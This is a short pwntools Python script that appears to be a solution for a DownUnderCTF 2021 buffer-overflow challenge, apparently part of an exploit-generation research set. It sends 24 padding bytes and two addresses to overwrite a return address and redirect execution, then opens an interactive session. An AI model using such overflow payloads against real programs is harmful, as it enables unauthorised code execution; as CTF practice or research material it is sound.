from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/bofaeg_challenges/13_downunderctf2021_out/downunderctf2021_out")
pwn.gdb.attach(p)
p.recvuntil(b'\nFool me once, shame on you. Fool me twice, shame on me.\n\nSeriously though, what features would be cool? Maybe it could play a song?\n')
payload = b"\x00" * 24
payload += p64(0x401016) + p64(0x4011e7)
payload += b"\n"
p.send(payload)
p.interactive()
